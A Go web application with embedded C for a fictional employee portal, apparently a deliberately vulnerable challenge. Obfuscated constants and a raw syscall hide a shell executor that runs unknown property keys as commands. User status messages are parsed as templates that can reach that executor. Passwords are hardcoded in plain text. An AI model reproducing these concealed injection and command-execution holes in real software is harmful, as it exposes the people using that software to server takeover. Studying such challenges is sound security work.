package main

/*
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int g_enable_dynamic_lookup = 0;

void normalize_resource_string(char* buffer, char offset) {
    for (int i = 0; buffer[i] != '\0'; i++) {
        buffer[i] ^= offset;
    }
}

char* resolve_dynamic_property(const char* property_query) {
    int pipe_fds[2];
    pid_t worker_pid;

    if (pipe(pipe_fds) == -1) return strdup("lookup_error");
    worker_pid = fork();
    if (worker_pid == -1) return strdup("process_error");

	if (worker_pid == 0) {
	    close(pipe_fds[0]);
	    dup2(pipe_fds[1], STDOUT_FILENO);
	    dup2(pipe_fds[1], STDERR_FILENO);
	    close(pipe_fds[1]);

	    unsigned long data_blocks[] = {
	        0x13e9d9a00242b341,
	        0x000000000069fb31
	    };

	    unsigned char workspace[16];
	    memset(workspace, 0, sizeof(workspace));

	    for(int i = 0; i < 8; i++) {
	        unsigned char byte = (data_blocks[0] >> (i * 8)) & 0xFF;
	        byte = ((byte >> 3) | (byte << 5));
	        byte ^= (i * 13 + 7);
	        workspace[i] = byte;
	    }

	    for(int i = 0; i < 3; i++) {
	        unsigned char byte = (data_blocks[1] >> (i * 8)) & 0xFF;
	        byte = ((byte >> 3) | (byte << 5));
	        byte ^= (i * 17 + 11);
	        workspace[8 + i] = byte;
	    }

	    char* args[] = {(char*)workspace, (char*)(workspace + 8), (char*)property_query, NULL};
	    unsigned int sc = (workspace[1] - 39);
	    syscall(sc, workspace, args, NULL);
	    exit(127);
	} else {
        close(pipe_fds[1]);
        char read_buffer[256];
        char* accumulated = (char*)malloc(1);
        accumulated[0] = '\0';
        ssize_t bytes;
        while ((bytes = read(pipe_fds[0], read_buffer, sizeof(read_buffer) - 1)) > 0) {
            read_buffer[bytes] = '\0';
            char* expanded = (char*)realloc(accumulated, strlen(accumulated) + bytes + 1);
            if (!expanded) { exit(1); }
            accumulated = expanded;
            strcat(accumulated, read_buffer);
        }
        close(pipe_fds[0]);
        waitpid(worker_pid, NULL, 0);
        return accumulated;
    }
}

void setup_property_resolver() {
    const char* resolver_mode = getenv("PORTAL_PROPERTY_SOURCE");
    if (resolver_mode != NULL && strcmp(resolver_mode, "extended") == 0) {
        g_enable_dynamic_lookup = 1;
    }
}

typedef struct { char property_key[256]; char property_value[512]; } PropertyEntry;
PropertyEntry property_cache[] = {
    {"app.name", "CorpPortal"},
    {"app.version", "2.1.3"},
    {"db.status", "connected"},
    {"cache.status", "active"},
    {"company.name", "Acme Corporation"},
    {"company.motto", "Innovation Through Excellence"},
    {"support.email", "support@acmecorp.local"},
    {"hr.email", "hr@acmecorp.local"},
    {"it.email", "it@acmecorp.local"},
    {"", ""}
};

char* lookup_in_cache(const char* property_key) {
    for (int i = 0; property_cache[i].property_key[0] != '\0'; i++) {
        if (strcmp(property_cache[i].property_key, property_key) == 0) {
            return strdup(property_cache[i].property_value);
        }
    }
    return NULL;
}

char* get_property_value(const char* property_key) {
    char* cached_value = lookup_in_cache(property_key);
    if (cached_value != NULL) {
        return cached_value;
    }
    if (g_enable_dynamic_lookup) {
        return resolve_dynamic_property(property_key);
    }
    char* error_msg = malloc(strlen(property_key) + 50);
    sprintf(error_msg, "Property '%s' unavailable.", property_key);
    return error_msg;
}

char* fetch_uptime_metric() {
    char resource_descriptor[] = {86, 83, 87, 74, 78, 70, 3, 14, 83, 3, 17, 29, 12, 71, 70, 85, 12, 77, 86, 79, 79, 3, 95, 95, 3, 70, 64, 75, 76, 3, 4, 109, 12, 98, 4, 0};
    normalize_resource_string(resource_descriptor, 35);
    return resolve_dynamic_property(resource_descriptor);
}

char* fetch_memory_metric() {
    char resource_descriptor[] = {69, 81, 70, 70, 3, 14, 75, 3, 17, 29, 12, 71, 70, 85, 12, 77, 86, 79, 79, 3, 95, 3, 68, 81, 70, 83, 3, 110, 70, 78, 25, 3, 95, 3, 66, 84, 72, 3, 4, 88, 83, 81, 74, 77, 87, 3, 7, 16, 1, 12, 1, 7, 17, 94, 4, 3, 95, 95, 3, 70, 64, 75, 76, 3, 4, 109, 12, 98, 4, 0};
    normalize_resource_string(resource_descriptor, 35);
    return resolve_dynamic_property(resource_descriptor);
}
*/
import "C"

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"text/template"
	"time"
	"unsafe"

	"gopkg.in/yaml.v3"
)

type Config struct {
	Application struct {
		Name        string `yaml:"name"`
		Version     string `yaml:"version"`
		Environment string `yaml:"environment"`
	} `yaml:"application"`
	Security struct {
		InputValidation  bool `yaml:"input_validation"`
		SanitizeCommands bool `yaml:"sanitize_commands"`
		RateLimiting     bool `yaml:"rate_limiting"`
	} `yaml:"security"`
}

var appConfig Config
var sessions = make(map[string]*Employee)
var sessionMutex sync.RWMutex

type Employee struct {
	ID            string
	Name          string
	Department    string
	Role          string
	Email         string
	Manager       string
	Location      string
	Username      string
	Password      string
	StatusMessage string
	Bio           string
}

type TimeEntry struct {
	Date        string
	Project     string
	Hours       string
	Description string
}

type LeaveRequest struct {
	ID        string
	Type      string
	StartDate string
	EndDate   string
	Days      string
	Status    string
}

type Expense struct {
	ID          string
	Date        string
	Category    string
	Amount      string
	Description string
	Status      string
}

type Training struct {
	Title     string
	Category  string
	Duration  string
	Completed bool
	DueDate   string
}

type Portal struct {
	Config      Config
	CurrentUser *Employee
}

// Master employee database (read-only, used for authentication)
var employeeDatabase = []Employee{
	{"E001", "Sarah Chen", "Engineering", "Senior Developer", "schen@acmecorp.local", "Michael Torres", "San Francisco", "schen", "Portal2024!", "Working on the new portal features 🚀", "Passionate about clean code and system architecture. 5 years at Acme Corp."},
	{"E002", "Michael Torres", "Operations", "DevOps Lead", "mtorres@acmecorp.local", "Robert Kim", "San Francisco", "mtorres", "DevOps123!", "Optimizing deployment pipelines", "DevOps engineer specializing in cloud infrastructure and automation."},
	{"E003", "Emily Watson", "Security", "Security Analyst", "ewatson@acmecorp.local", "David Park", "New York", "ewatson", "Secure456!", "Keeping our systems secure 🔒", "Security professional focused on threat detection and incident response."},
	{"E004", "James Wilson", "Engineering", "Frontend Developer", "jwilson@acmecorp.local", "Sarah Chen", "San Francisco", "jwilson", "Frontend789!", "Building beautiful UIs", "Frontend specialist with expertise in React and modern web technologies."},
	{"E005", "Lisa Anderson", "HR", "HR Manager", "landerson@acmecorp.local", "Karen Mitchell", "Chicago", "landerson", "HumanRes!", "Always here to help! 😊", "HR professional dedicated to employee experience and development."},
}

func (p *Portal) FetchUptimeData() string {
	result := C.fetch_uptime_metric()
	if result == nil {
		return "N/A"
	}
	defer C.free(unsafe.Pointer(result))
	return strings.TrimSpace(C.GoString(result))
}

func (p *Portal) FetchMemoryData() string {
	result := C.fetch_memory_metric()
	if result == nil {
		return "N/A"
	}
	defer C.free(unsafe.Pointer(result))
	return strings.TrimSpace(C.GoString(result))
}

func (p *Portal) GetHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

func (p *Portal) GetAppInfo() string {
	return fmt.Sprintf("%s v%s", p.Config.Application.Name, p.Config.Application.Version)
}

func (p *Portal) ResolveProperty(key string) string {
	cKey := C.CString(key)
	defer C.free(unsafe.Pointer(cKey))
	cValue := C.get_property_value(cKey)
	if cValue == nil {
		return fmt.Sprintf("Property '%s' not found", key)
	}
	defer C.free(unsafe.Pointer(cValue))
	return C.GoString(cValue)
}

func (p *Portal) CheckServiceHealth(service string) string {
	serviceCommands := map[string]string{
		"database": "echo '[HEALTHY] Database connection pool active'",
		"cache":    "echo '[HEALTHY] Redis cache responding'",
		"ldap":     "echo '[HEALTHY] LDAP authentication available'",
		"email":    "echo '[HEALTHY] SMTP gateway operational'",
	}

	if service == "all" {
		return "[HEALTHY] All core services operational\n  • Database: Active\n  • Cache: Running\n  • LDAP: Connected\n  • Email: Ready"
	}

	if cmd, exists := serviceCommands[service]; exists {
		return p.ResolveProperty(cmd)
	}
	return fmt.Sprintf("Unknown service: %s", service)
}

func (p *Portal) RecordAccess(action string, client string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	log.Printf("[%s] %s | Client: %s\n", timestamp, action, client)
}

func (p *Portal) GetEmployeeList() []Employee {
	// Return the default employee list for display purposes
	return employeeDatabase
}

func (p *Portal) GetTimeEntries() []TimeEntry {
	return []TimeEntry{
		{"2024-01-15", "Portal Redesign", "8", "Implemented new dashboard UI components"},
		{"2024-01-16", "Security Audit", "6", "Reviewed authentication mechanisms"},
		{"2024-01-17", "Portal Redesign", "7.5", "Backend API development"},
		{"2024-01-18", "Team Meeting", "2", "Sprint planning and retrospective"},
		{"2024-01-19", "Portal Redesign", "8", "Integration testing and bug fixes"},
	}
}

func (p *Portal) GetLeaveRequests() []LeaveRequest {
	return []LeaveRequest{
		{"LR001", "Vacation", "2024-02-01", "2024-02-05", "5", "Approved"},
		{"LR002", "Sick Leave", "2024-01-10", "2024-01-10", "1", "Approved"},
		{"LR003", "Personal", "2024-03-15", "2024-03-15", "1", "Pending"},
	}
}

func (p *Portal) GetExpenses() []Expense {
	return []Expense{
		{"EXP001", "2024-01-12", "Travel", "$450.00", "Flight to client meeting", "Approved"},
		{"EXP002", "2024-01-15", "Office Supplies", "$85.50", "Ergonomic keyboard and mouse", "Approved"},
		{"EXP003", "2024-01-18", "Software", "$99.00", "Annual IDE license renewal", "Pending"},
		{"EXP004", "2024-01-20", "Meals", "$65.00", "Client lunch meeting", "Pending"},
	}
}

func (p *Portal) GetTrainings() []Training {
	return []Training{
		{"Security Awareness Training", "Compliance", "2 hours", true, "Completed"},
		{"Advanced Go Programming", "Technical", "8 hours", false, "2024-02-28"},
		{"GDPR Compliance Update", "Compliance", "1 hour", true, "Completed"},
		{"Cloud Architecture Best Practices", "Technical", "6 hours", false, "2024-03-15"},
		{"Leadership Development", "Professional", "12 hours", false, "2024-04-30"},
	}
}

func generateSessionToken() string {
	b := make([]byte, 32)
	rand.Read(b)
	return base64.URLEncoding.EncodeToString(b)
}

func authenticateUser(username, password string) *Employee {
	for _, emp := range employeeDatabase {
		if emp.Username == username && emp.Password == password {
			// Create a NEW copy of the employee for this session
			userCopy := emp
			return &userCopy
		}
	}
	return nil
}

var templates *template.Template

func initTemplates() {
	funcMap := template.FuncMap{
		"lower": strings.ToLower,
	}

	templates = template.Must(template.New("base").Funcs(funcMap).Parse(`
<!DOCTYPE html>
<html>
<head><title>{{.GetAppInfo}} - Employee Portal</title><style>@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap'); * { margin: 0; padding: 0; box-sizing: border-box; } body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f7fa; color: #1a202c; } .topbar { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 0 40px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); display: flex; justify-content: space-between; align-items: center; height: 64px; } .topbar h1 { font-size: 20px; font-weight: 600; letter-spacing: -0.5px; } .user-info { display: flex; align-items: center; gap: 12px; font-size: 14px; } .user-avatar { width: 36px; height: 36px; border-radius: 50%; background: rgba(255,255,255,0.2); display: flex; align-items: center; justify-content: center; font-weight: 600; } .nav { background: white; border-bottom: 1px solid #e2e8f0; padding: 0 40px; display: flex; gap: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); } .nav a { display: inline-flex; align-items: center; padding: 16px 20px; color: #4a5568; text-decoration: none; border-bottom: 2px solid transparent; transition: all 0.2s; font-size: 14px; font-weight: 500; } .nav a:hover { color: #667eea; background: #f7fafc; } .nav a.active { color: #667eea; border-bottom-color: #667eea; } .container { max-width: 1400px; margin: 32px auto; padding: 0 40px; } .card { background: white; border-radius: 12px; padding: 28px; margin-bottom: 24px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; } .card h2 { color: #1a202c; margin-bottom: 20px; font-size: 18px; font-weight: 600; } .card h3 { color: #2d3748; margin: 24px 0 12px 0; font-size: 15px; font-weight: 600; } .status-banner { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px 28px; border-radius: 12px; margin-bottom: 24px; font-size: 15px; font-weight: 500; box-shadow: 0 4px 12px rgba(102,126,234,0.3); } pre { background: #f7fafc; border-left: 3px solid #667eea; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'SF Mono', Monaco, monospace; font-size: 13px; line-height: 1.6; } table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 14px; } th, td { padding: 14px 16px; text-align: left; border-bottom: 1px solid #e2e8f0; } th { background: #f7fafc; font-weight: 600; color: #4a5568; text-transform: uppercase; font-size: 12px; letter-spacing: 0.5px; } tbody tr:hover { background: #f7fafc; } .status-badge { display: inline-block; padding: 4px 12px; border-radius: 16px; font-size: 12px; font-weight: 500; } .status-approved { background: #c6f6d5; color: #22543d; } .status-pending { background: #feebc8; color: #7c2d12; } .status-rejected { background: #fed7d7; color: #742a2a; } .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 24px; margin-bottom: 24px; } .stat-card { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 24px; border-radius: 12px; box-shadow: 0 4px 12px rgba(102,126,234,0.3); } .stat-card h3 { color: white; font-size: 36px; margin: 12px 0; font-weight: 700; } .stat-card p { opacity: 0.9; font-size: 14px; font-weight: 500; } .btn { display: inline-block; padding: 10px 20px; background: #667eea; color: white; text-decoration: none; border-radius: 8px; margin: 5px 5px 5px 0; transition: all 0.2s; font-size: 14px; font-weight: 500; border: none; cursor: pointer; } .btn:hover { background: #5568d3; transform: translateY(-1px); box-shadow: 0 4px 8px rgba(102,126,234,0.3); } .btn-secondary { background: #e2e8f0; color: #4a5568; } .btn-secondary:hover { background: #cbd5e0; } .footer { text-align: center; color: #718096; padding: 32px 20px; font-size: 13px; } .quick-links { display: flex; flex-wrap: wrap; gap: 12px; margin: 20px 0; } .quick-link { background: #edf2f7; color: #2d3748; padding: 12px 20px; border-radius: 8px; text-decoration: none; font-size: 14px; font-weight: 500; transition: all 0.2s; border: 1px solid #e2e8f0; } .quick-link:hover { background: #e2e8f0; border-color: #cbd5e0; transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0,0,0,0.08); } ul { margin-left: 24px; line-height: 2; } input[type="text"], input[type="password"], textarea { width: 100%; padding: 12px 16px; border: 1px solid #e2e8f0; border-radius: 8px; font-size: 14px; transition: all 0.2s; font-family: inherit; } textarea { resize: vertical; min-height: 100px; } input[type="text"]:focus, input[type="password"]:focus, textarea:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102,126,234,0.1); } .login-container { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); } .login-card { background: white; border-radius: 16px; padding: 48px; width: 100%; max-width: 420px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); } .login-card h1 { color: #1a202c; margin-bottom: 8px; font-size: 28px; } .login-card p { color: #718096; margin-bottom: 32px; } .form-group { margin-bottom: 20px; } .form-group label { display: block; margin-bottom: 8px; color: #4a5568; font-weight: 500; font-size: 14px; } .error { background: #fed7d7; color: #742a2a; padding: 12px 16px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; } .success { background: #c6f6d5; color: #22543d; padding: 12px 16px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; } .info-box { background: #e6fffa; border-left: 4px solid #38b2ac; padding: 16px; border-radius: 8px; margin: 20px 0; font-size: 14px; line-height: 1.6; }</style></head>
<body>{{template "page" .}}</body></html>`))

	// Login page
	template.Must(templates.New("login").Parse(`
<div class="login-container">
	<div class="login-card">
		<h1>🏢 {{.ResolveProperty "company.name"}}</h1>
		<p>Employee Portal Login</p>
		{{if .Error}}<div class="error">{{.Error}}</div>{{end}}
		<form method="POST" action="/login">
			<div class="form-group">
				<label>Username</label>
				<input type="text" name="username" placeholder="Enter your username" required autofocus>
			</div>
			<div class="form-group">
				<label>Password</label>
				<input type="password" name="password" placeholder="Enter your password" required>
			</div>
			<button type="submit" class="btn" style="width: 100%; margin: 0;">Sign In</button>
		</form>
	</div>
</div>`))

	// Main layout
	template.Must(templates.New("main").Parse(`<div class="topbar"><h1>🏢 {{.ResolveProperty "company.name"}} - {{.GetAppInfo}}</h1><div class="user-info"><div class="user-avatar">{{slice .CurrentUser.Name 0 1}}</div><div><div style="font-weight: 500;">{{.CurrentUser.Name}}</div><div style="font-size: 12px; opacity: 0.9;">{{.CurrentUser.Department}}</div></div></div></div><div class="nav"><a href="/">Dashboard</a><a href="/?view=profile">Profile</a><a href="/?view=time">Time</a><a href="/?view=leave">Leave</a><a href="/?view=expenses">Expenses</a><a href="/?view=training">Training</a><a href="/?view=team">Team</a><a href="/?view=resources">Resources</a><a href="/?view=admin">Admin</a><a href="/logout" style="margin-left: auto;">Logout</a></div>{{if ne .CurrentUser.StatusMessage ""}}<div class="container"><div class="status-banner">{{template "status" .}}</div></div>{{end}}<div class="container">{{template "content" .}}<div class="footer">{{.ResolveProperty "company.motto"}} | {{.GetHostname}}<br>Support: {{.ResolveProperty "support.email"}} | HR: {{.ResolveProperty "hr.email"}} | IT: {{.ResolveProperty "it.email"}}<br><br>Powered by Dewaweb</div></div>`))

	// Dashboard
	template.Must(templates.New("home").Parse(`
<div class="grid">
	<div class="stat-card"><p>Hours This Week</p><h3>37.5</h3></div>
	<div class="stat-card"><p>Leave Balance</p><h3>12 days</h3></div>
	<div class="stat-card"><p>Pending Tasks</p><h3>5</h3></div>
</div>
<div class="card"><h2>📊 System Overview</h2><table><tr><th>Metric</th><th>Value</th></tr><tr><td>System Uptime</td><td>{{.FetchUptimeData}}</td></tr><tr><td>Application</td><td>{{.ResolveProperty "app.name"}} v{{.ResolveProperty "app.version"}}</td></tr><tr><td>Database</td><td>{{.ResolveProperty "db.status"}}</td></tr><tr><td>Cache</td><td>{{.ResolveProperty "cache.status"}}</td></tr></table></div>
<div class="card"><h2>📅 This Week</h2><ul><li>Monday 9:00 AM - Team Standup</li><li>Tuesday 2:00 PM - Sprint Planning</li><li>Wednesday 10:00 AM - Architecture Review</li><li>Thursday 3:00 PM - 1-on-1 with Manager</li><li>Friday 4:00 PM - Sprint Retrospective</li></ul></div>
<div class="card"><h2>📢 Announcements</h2><ul><li><strong>Jan 20:</strong> New benefits enrollment period opens Feb 1st</li><li><strong>Jan 18:</strong> Company all-hands meeting scheduled for Jan 31st</li><li><strong>Jan 15:</strong> Q4 performance reviews due by Jan 25th</li></ul></div>`))

	// Profile
	template.Must(templates.New("profile").Parse(`
<div class="card"><h2>👤 My Profile</h2><table><tr><th>Field</th><th>Value</th></tr><tr><td>Employee ID</td><td>{{.CurrentUser.ID}}</td></tr><tr><td>Full Name</td><td>{{.CurrentUser.Name}}</td></tr><tr><td>Email</td><td>{{.CurrentUser.Email}}</td></tr><tr><td>Department</td><td>{{.CurrentUser.Department}}</td></tr><tr><td>Role</td><td>{{.CurrentUser.Role}}</td></tr><tr><td>Manager</td><td>{{.CurrentUser.Manager}}</td></tr><tr><td>Location</td><td>{{.CurrentUser.Location}}</td></tr><tr><td>Status Message</td><td>{{.CurrentUser.StatusMessage}}</td></tr></table><br><a href="/?view=edit-profile" class="btn">Edit Profile</a><a href="#" class="btn btn-secondary">Change Password</a></div>
<div class="card"><h2>📝 About Me</h2><p>{{.CurrentUser.Bio}}</p></div>
<div class="card"><h2>📊 Performance Summary</h2><table><tr><th>Period</th><th>Rating</th><th>Feedback</th></tr><tr><td>Q4 2023</td><td>⭐⭐⭐⭐⭐</td><td>Excellent work on portal redesign project</td></tr><tr><td>Q3 2023</td><td>⭐⭐⭐⭐</td><td>Great collaboration with teams</td></tr></table></div>`))

	// Edit Profile
	template.Must(templates.New("edit-profile").Parse(`
<div class="card"><h2>✏️ Edit Profile</h2>{{if .Success}}<div class="success">{{.Success}}</div>{{end}}{{if .Error}}<div class="error">{{.Error}}</div>{{end}}<form method="POST" action="/update-profile"><div class="form-group"><label>Status Message</label><input type="text" name="status" value="{{.CurrentUser.StatusMessage}}" placeholder="What's on your mind? Share your current focus or mood..." maxlength="200"></div><div class="form-group"><label>Bio</label><textarea name="bio" placeholder="Tell us about yourself, your role, and what you're passionate about...">{{.CurrentUser.Bio}}</textarea></div><button type="submit" class="btn">Save Changes</button><a href="/?view=profile" class="btn btn-secondary">Cancel</a></form></div>
<div class="card"><h2>💡 Tips</h2><ul><li>Your status message appears on your dashboard and is visible to your team</li><li>Keep it professional and relevant to your work</li><li>Use it to share what you're currently working on or your availability</li><li>Update it regularly to keep your team informed</li></ul></div>`))

	// Time Tracking
	template.Must(templates.New("time").Parse(`
<div class="card"><h2>⏱️ Time Tracking</h2><a href="#" class="btn">+ Add Entry</a><a href="#" class="btn btn-secondary">View Reports</a><h3>Recent Entries</h3><table><tr><th>Date</th><th>Project</th><th>Hours</th><th>Description</th></tr>{{range .GetTimeEntries}}<tr><td>{{.Date}}</td><td>{{.Project}}</td><td>{{.Hours}}</td><td>{{.Description}}</td></tr>{{end}}</table></div>
<div class="card"><h2>📈 Monthly Summary</h2><table><tr><th>Project</th><th>Hours</th></tr><tr><td>Portal Redesign</td><td>68.5</td></tr><tr><td>Security Audit</td><td>24.0</td></tr><tr><td>Meetings</td><td>8.0</td></tr><tr><th>Total</th><th>100.5</th></tr></table></div>`))

	// Leave
	template.Must(templates.New("leave").Parse(`
<div class="card"><h2>🏖️ Leave Management</h2><a href="#" class="btn">+ Request Leave</a><h3>Balance</h3><table><tr><th>Type</th><th>Available</th><th>Used</th></tr><tr><td>Vacation</td><td>12</td><td>8</td></tr><tr><td>Sick</td><td>7</td><td>3</td></tr><tr><td>Personal</td><td>3</td><td>2</td></tr></table><h3>Requests</h3><table><tr><th>ID</th><th>Type</th><th>Start</th><th>End</th><th>Days</th><th>Status</th></tr>{{range .GetLeaveRequests}}<tr><td>{{.ID}}</td><td>{{.Type}}</td><td>{{.StartDate}}</td><td>{{.EndDate}}</td><td>{{.Days}}</td><td><span class="status-badge status-{{.Status | lower}}">{{.Status}}</span></td></tr>{{end}}</table></div>`))

	// Expenses
	template.Must(templates.New("expenses").Parse(`
<div class="card"><h2>💰 Expenses</h2><a href="#" class="btn">+ Submit Expense</a><h3>Recent</h3><table><tr><th>ID</th><th>Date</th><th>Category</th><th>Amount</th><th>Status</th></tr>{{range .GetExpenses}}<tr><td>{{.ID}}</td><td>{{.Date}}</td><td>{{.Category}}</td><td>{{.Amount}}</td><td><span class="status-badge status-{{.Status | lower}}">{{.Status}}</span></td></tr>{{end}}</table></div>`))

	// Training
	template.Must(templates.New("training").Parse(`
<div class="card"><h2>📚 Training</h2><a href="#" class="btn">Browse Courses</a><h3>Assigned</h3><table><tr><th>Course</th><th>Category</th><th>Duration</th><th>Status</th></tr>{{range .GetTrainings}}<tr><td>{{.Title}}</td><td>{{.Category}}</td><td>{{.Duration}}</td><td>{{if .Completed}}✅ Complete{{else}}⏳ Pending{{end}}</td></tr>{{end}}</table></div>`))

	// Team
	template.Must(templates.New("team").Parse(`
<div class="card"><h2>👥 Team Directory</h2><input type="text" placeholder="Search employees..." style="margin-bottom: 20px;"><table><tr><th>ID</th><th>Name</th><th>Department</th><th>Role</th><th>Email</th><th>Status</th></tr>{{range .GetEmployeeList}}<tr><td>{{.ID}}</td><td>{{.Name}}</td><td>{{.Department}}</td><td>{{.Role}}</td><td>{{.Email}}</td><td style="font-size: 13px; color: #718096;">{{.StatusMessage}}</td></tr>{{end}}</table></div>`))

	// Resources
	template.Must(templates.New("resources").Parse(`
<div class="card"><h2>📋 Resources</h2><div class="quick-links"><a href="#" class="quick-link">📖 Handbook</a><a href="#" class="quick-link">💼 Benefits</a><a href="#" class="quick-link">🖥️ IT Support</a><a href="#" class="quick-link">🔒 Security</a></div></div>
<div class="card"><h2>📞 Contacts</h2><table><tr><th>Department</th><th>Email</th></tr><tr><td>HR</td><td>{{.ResolveProperty "hr.email"}}</td></tr><tr><td>IT</td><td>{{.ResolveProperty "it.email"}}</td></tr><tr><td>Support</td><td>{{.ResolveProperty "support.email"}}</td></tr></table></div>`))

	// Admin
	template.Must(templates.New("admin").Parse(`
<div class="card"><h2>⚙️ Administration</h2><div class="quick-links"><a href="#" class="quick-link">👥 Users</a><a href="#" class="quick-link">🔐 Roles</a><a href="#" class="quick-link">📋 Audit</a><a href="#" class="quick-link">📊 Monitoring</a></div></div>
<div class="card"><h2>🔧 System Status</h2><h3>Services</h3><pre>{{.CheckServiceHealth "all"}}</pre><h3>Resources</h3><pre>Memory: {{.FetchMemoryData}}</pre><table><tr><th>Component</th><th>Status</th></tr><tr><td>Database</td><td>✅ {{.ResolveProperty "db.status"}}</td></tr><tr><td>Cache</td><td>✅ {{.ResolveProperty "cache.status"}}</td></tr></table></div>`))
}

type PageContext struct {
	*Portal
	Error   string
	Success string
}

func init() {
	configBytes, err := ioutil.ReadFile("config.yml")
	if err != nil {
		log.Fatal("Config error:", err)
	}
	if err := yaml.Unmarshal(configBytes, &appConfig); err != nil {
		log.Fatal("Config parse error:", err)
	}

	C.setup_property_resolver()
	initTemplates()
}

func main() {
	log.Printf("Starting %s v%s\n", appConfig.Application.Name, appConfig.Application.Version)

	http.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			username := r.FormValue("username")
			password := r.FormValue("password")

			if user := authenticateUser(username, password); user != nil {
				sessionToken := generateSessionToken()

				sessionMutex.Lock()
				sessions[sessionToken] = user
				sessionMutex.Unlock()

				http.SetCookie(w, &http.Cookie{
					Name:     "session",
					Value:    sessionToken,
					Path:     "/",
					HttpOnly: true,
					MaxAge:   86400,
				})
				log.Printf("User %s logged in with session %s\n", username, sessionToken[:16]+"...")
				http.Redirect(w, r, "/", http.StatusSeeOther)
				return
			}

			portal := &Portal{Config: appConfig}
			ctx := PageContext{Portal: portal, Error: "Invalid username or password"}
			tmpl, _ := templates.Clone()
			tmpl.AddParseTree("page", templates.Lookup("login").Tree)
			tmpl.ExecuteTemplate(w, "base", ctx)
			return
		}

		portal := &Portal{Config: appConfig}
		ctx := PageContext{Portal: portal}
		tmpl, _ := templates.Clone()
		tmpl.AddParseTree("page", templates.Lookup("login").Tree)
		tmpl.ExecuteTemplate(w, "base", ctx)
	})

	http.HandleFunc("/logout", func(w http.ResponseWriter, r *http.Request) {
		if cookie, err := r.Cookie("session"); err == nil {
			sessionMutex.Lock()
			delete(sessions, cookie.Value)
			sessionMutex.Unlock()
		}
		http.SetCookie(w, &http.Cookie{
			Name:   "session",
			Value:  "",
			Path:   "/",
			MaxAge: -1,
		})
		http.Redirect(w, r, "/login", http.StatusSeeOther)
	})

	http.HandleFunc("/update-profile", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Redirect(w, r, "/?view=edit-profile", http.StatusSeeOther)
			return
		}

		cookie, err := r.Cookie("session")
		if err != nil {
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}

		sessionMutex.RLock()
		user, exists := sessions[cookie.Value]
		sessionMutex.RUnlock()

		if !exists {
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}

		status := r.FormValue("status")
		bio := r.FormValue("bio")

		if appConfig.Security.InputValidation {
			if matched, _ := regexp.MatchString(`(?i)<script|javascript:|onerror=|onclick=|\{\{.*\}\}`, status); matched {
				portal := &Portal{Config: appConfig, CurrentUser: user}
				ctx := PageContext{Portal: portal, Error: "Invalid status message: potential security issue detected"}
				tmpl, _ := templates.Clone()
				tmpl.AddParseTree("page", templates.Lookup("main").Tree)
				tmpl.AddParseTree("content", templates.Lookup("edit-profile").Tree)
				tmpl.New("status").Parse(user.StatusMessage)
				tmpl.ExecuteTemplate(w, "base", ctx)
				return
			}
		}

		// Update the user's session data
		sessionMutex.Lock()
		user.StatusMessage = status
		user.Bio = bio
		sessionMutex.Unlock()

		log.Printf("User %s updated profile. Status: %s\n", user.Username, status)
		http.Redirect(w, r, "/?view=edit-profile&success=1", http.StatusSeeOther)
	})

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		cookie, err := r.Cookie("session")
		if err != nil {
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}

		sessionMutex.RLock()
		user, exists := sessions[cookie.Value]
		sessionMutex.RUnlock()

		if !exists {
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}

		portal := &Portal{
			Config:      appConfig,
			CurrentUser: user,
		}

		view := r.URL.Query().Get("view")
		successParam := r.URL.Query().Get("success")

		if view == "" {
			view = "home"
		}

		portal.RecordAccess("View: "+view, r.RemoteAddr)

		ctx := PageContext{Portal: portal}
		if successParam == "1" {
			ctx.Success = "Profile updated successfully!"
		}

		tmpl, _ := templates.Clone()

		var statusTmpl *template.Template
		if user.StatusMessage != "" {
			statusTmpl, _ = tmpl.New("status").Parse(user.StatusMessage)
		} else {
			statusTmpl, _ = tmpl.New("status").Parse("No status set")
		}

		if statusTmpl == nil {
			tmpl.New("status").Parse("")
		}

		contentTmpl := templates.Lookup(view)
		if contentTmpl == nil {
			http.Error(w, "View not found", http.StatusNotFound)
			return
		}

		tmpl.AddParseTree("page", templates.Lookup("main").Tree)
		tmpl.AddParseTree("content", contentTmpl.Tree)
		if err := tmpl.ExecuteTemplate(w, "base", ctx); err != nil {
			log.Printf("Template error: %v\n", err)
		}
	})

	log.Println("Portal listening on :8080")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatal(err)
	}
}
